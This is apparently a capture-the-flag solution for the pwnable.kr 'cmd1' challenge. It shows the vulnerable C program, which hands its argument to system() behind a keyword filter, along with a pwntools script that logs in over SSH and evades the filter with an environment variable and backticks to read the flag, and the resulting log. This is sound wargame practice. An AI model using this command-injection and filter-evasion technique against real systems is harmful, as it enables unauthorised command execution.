'''
Description:

    Mommy! what is PATH environment in Linux?

    ssh cmd1@pwnable.kr -p2222 (pw:guest)

Source of cmd1.c:

    #include <stdio.h>
    #include <string.h>

    int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
    }
    int main(int argc, char* argv[], char** envp){
        putenv("PATH=/fuckyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
    }

Solution

Solver:
'''

from pwn import *

user    = 'cmd1'
passwd  = 'guest'
host    = 'pwnable.kr'
port    = 2222
command = 'export TT=flag; ./cmd1 \'/bin/cat `echo $TT`\''

s = ssh(user, host, port, passwd)
flag, status = s.run_to_end(command)
print '[+] Flag:', flag
s.close()

'''
Log:

[+] Connecting to pwnable.kr on port 2222: Done
[+] Flag: mommy now I get what PATH environment is for :)

[*] Closed connection to 'pwnable.kr'
'''
